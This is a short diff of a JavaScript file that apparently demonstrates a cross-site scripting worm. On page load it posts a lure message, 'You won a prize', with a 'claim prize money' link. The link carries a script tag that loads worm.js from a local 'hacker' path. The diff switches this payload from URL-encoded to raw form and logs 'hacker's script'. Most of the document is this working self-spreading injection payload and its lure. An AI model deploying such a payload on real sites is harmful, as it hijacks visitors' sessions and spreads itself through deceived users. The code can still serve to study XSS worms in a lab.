@@ -49,7 +49,7 @@ window.onload = function()
 
     var data = {
         title: "你中奖了",
-        content:"<a href='http://article.com/worm/index?worm=%3Cscript%20src=%22http://localhost/hacker/worm.js%22%3E%3C/script%3E'>领取奖金</a>",
+        content:"<a href='http://article.com/worm/index?worm=<script src=http://localhost/hacker/worm.js></script>领取奖金</a>",
         imgUrl: "http://p5w5qhvkn.bkt.clouddn.com/meizi.jpg"
     };
 
@@ -60,6 +60,7 @@ window.onload = function()
         dataType: "json",
         success: function (response, xml) {
             console.log(response)
+            console.log("黑客的脚本");
             // 此处放成功后执行的代码
         },
         fail: function (status) {
